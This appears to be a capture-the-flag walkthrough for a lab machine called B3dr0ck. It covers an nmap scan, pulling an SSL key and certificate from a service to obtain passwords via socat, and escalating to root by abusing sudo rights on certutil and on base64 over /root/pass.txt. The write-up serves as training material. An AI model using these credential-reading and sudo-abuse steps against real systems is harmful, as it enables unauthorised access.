
# B3dr0ck Walkthrough

## Setup

Prior to enumerating or attacking the target, I like to save the target IP address in an environment variable `$TARGET` so I do not have to remember it when interacting with the machine using the terminal.

```bash
export TARGET=<target_ip>
```

Another easy way to save the target IP is adding it to the `/etc/hosts` file and giving it a domain name (ex: `bedrock.thm`).

## Enumeration

Command:

```bash
nmap -sC -sV -A -O -p- -n -T5 -oN nmap/all_ports $TARGET
```

Results:

```bash
Nmap scan report for 10.10.181.108
Host is up (0.085s latency).
Not shown: 65530 closed ports
PORT      STATE SERVICE      VERSION
22/tcp    open  ssh          OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 1a:c7:00:71:b6:65:f5:82:d8:24:80:72:48:ad:99:6e (RSA)
|   256 3a:b5:25:2e:ea:2b:44:58:24:55:ef:82:ce:e0:ba:eb (ECDSA)
|_  256 cf:10:02:8e:96:d3:24:ad:ae:7d:d1:5a:0d:c4:86:ac (ED25519)
80/tcp    open  http         nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://10.10.181.108:4040/
4040/tcp  open  ssl/yo-main?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Content-type: text/html
|     Date: Mon, 24 Oct 2022 23:34:35 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <title>ABC</title>
|     <style>
|     body {
|     width: 35em;
|     margin: 0 auto;
|     font-family: Tahoma, Verdana, Arial, sans-serif;
|     </style>
|     </head>
|     <body>
|     <h1>Welcome to ABC!</h1>
|     <p>Abbadabba Broadcasting Compandy</p>
|     <p>We're in the process of building a website! Can you believe this technology exists in bedrock?!?</p>
|     <p>Barney is helping to setup the server, and he said this info was important...</p>
|     <pre>
|     Hey, it's Barney. I only figured out nginx so far, what the h3ll is a database?!?
|     Bamm Bamm tried to setup a sql database, but I don't see it running.
|     Looks like it started something else, but I'm not sure how to turn it off...
|     said it was from the toilet and OVER 9000!
|     Need to try and secure
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Content-type: text/html
|     Date: Mon, 24 Oct 2022 23:34:36 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <title>ABC</title>
|     <style>
|     body {
|     width: 35em;
|     margin: 0 auto;
|     font-family: Tahoma, Verdana, Arial, sans-serif;
|     </style>
|     </head>
|     <body>
|     <h1>Welcome to ABC!</h1>
|     <p>Abbadabba Broadcasting Compandy</p>
|     <p>We're in the process of building a website! Can you believe this technology exists in bedrock?!?</p>
|     <p>Barney is helping to setup the server, and he said this info was important...</p>
|     <pre>
|     Hey, it's Barney. I only figured out nginx so far, what the h3ll is a database?!?
|     Bamm Bamm tried to setup a sql database, but I don't see it running.
|     Looks like it started something else, but I'm not sure how to turn it off...
|     said it was from the toilet and OVER 9000!
|_    Need to try and secure
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2022-10-24T23:18:43
|_Not valid after:  2023-10-24T23:18:43
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
9009/tcp  open  pichat?
| fingerprint-strings: 
|   NULL: 
|     ____ _____ 
|     \x20\x20 / / | | | | /\x20 | _ \x20/ ____|
|     \x20\x20 /\x20 / /__| | ___ ___ _ __ ___ ___ | |_ ___ / \x20 | |_) | | 
|     \x20/ / / _ \x20|/ __/ _ \| '_ ` _ \x20/ _ \x20| __/ _ \x20 / /\x20\x20| _ <| | 
|     \x20 /\x20 / __/ | (_| (_) | | | | | | __/ | || (_) | / ____ \| |_) | |____ 
|     ___|_|______/|_| |_| |_|___| _____/ /_/ _____/ _____|
|_    What are you looking for?
54321/tcp open  ssl/unknown
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: 
|_    Error: 'undefined' is not authorized for access.
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2022-10-24T23:18:43
|_Not valid after:  2023-10-24T23:18:43
|_ssl-date: TLS randomness does not represent time
```

## Site Interaction

When attempting to reach `http://$TARGET` the user gets redirected to `https://$TARGET:4040` and gets an invalid certificate error message. To get around this in Firefox, the user can enter `http://$TARGET:4040` and `Accept Risk And Continue` when presented with the certificate warning.

Once the user is viewing the page, they are presented with a message from Barney:

```
Hey, it's Barney. I only figured out nginx so far, what the h3ll is a database?!?
Bamm Bamm tried to setup a sql database, but I don't see it running.
Looks like it started something else, but I'm not sure how to turn it off...
said it was from the toilet and OVER 9000!
```

This reference of "OVER 9000" is probably a reference to port 9009. Heading to that port in  a browser yields no meaningful results. When attempting to connect to the port using a tool like `nc` or `netcat` however, the user is prompted with the question `What are you looking for?`.  If the user types in `key` or `certificate` what appears to be an `SSL Key` and an `SSL Certificate` are returned. The user must save these two values in local files to continue onto the next step of exploiting this machine. 

When the user types `help` they are presented with a message to use `socat` to connect to `54321` using the pulled down `SSL Key` and `SSL Certificate`.

The process of pulling down and saving both the `key` and `certificate` have been automated by [grab_cert](grab_cert.py).

## Barney's Password

After pulling down the `key` and `certificate` from port `9009`, the user can successfully connect to port `54321` the `socat` command provided.

```bash
socat stdio ssl:$TARGET:54321,cert=<cert_name>,key=<key_name>,verify=0
```

When the user enters `password` or `help`, they are presented with a "password hint". 

*Side Note: 
When I first saw the "password hint", I thought it was the hash of Barney's password and attempted to crack it using john. A result came back saying "emerald" was the cracked hash and I tried using that to SSH into the target machine. It took a little while before I realized the password was what I thought was a hash of the password.*

After looking at the password hint, the user can SSH into the target machine using the command:

```bash
ssh barney@$TARGET
```

and entering Barney's password when prompted.

Once logged into the machine as Barney, the user can navigate to Barney's home directory to find the first flag.

## PrivEsc: Barney --> Fred

Knowing Barney's password is a big help for privilege escalation. This allows the user to run the `sudo` command to see if Barney has any eleveated permisisons granted to his user. 

Running `sudo -l` shows that Barney has the ability to run `/usr/bin/certutil` using `sudo`. Using this knowledge, the user can get Fred's `cert-key` pair and repeat the process that was used to obtain Barney's login credentials. 

Command:

```bash
sudo /usr/bin/certutil fred 'Fred Flinstone'
```

After running the above command, the user will be given the `cert-key` pair for Fred. After saving both the `key` and `certificate` for Fred in local files, the user can run:

```bash
socat stdio ssl:$TARGET:54321,cert=<fred_cert>,key=<fred_key>,verify=0
```

The user can now enter `password` when prompted and be presented with Fred's password. 

Back in the SSH session, the user can switch to Fred's profile by entering:

```bash
su fred
```

and entering Fred's credentials when prompted.

After elevating to Fred's account, the user can move to Fred's home directory and grab his flag.

## PrivEsc: Fred --> Root

Elevating privilege from Fred to Root is similar to the way privilege was elevated from Barney to Fred. First, the user should run `sudo -l` to see what `sudo` permissions Fred has.

Command:

```bash
sudo -l
```

Privileges:

```bash
/usr/bin/base32 /root/pass.txt
/usr/bin/base64 /root/pass.txt
```

The user can run both `base32` and `base64` on `/root/pass.txt` using the `sudo` command. To extract the contents of that file, the user can run the command:

```bash
sudo /usr/bin/base64 /root/pass.txt | base64 -d
```

The output of that file looks strange and does not appear to be a hash. When testing the output, the `base32 -d` gives an output that looks like base64 encoded data. The user can then run `base64 -d` on that data and get what appears to be a hash returned. Placing this output in `crackstation.net` will give the user the root password and allow them to elevate to a root shell using `su`. 

/root/pass.txt Decode One-Liner:

```bash
sudo /usr/bin/base64 /root/pass.txt | base64 -d | base32 -d | base64 -d
```

Once elevated to root, the user can go to the `/root` directory and obtain the root flag, signifying the complete takeover of the machine.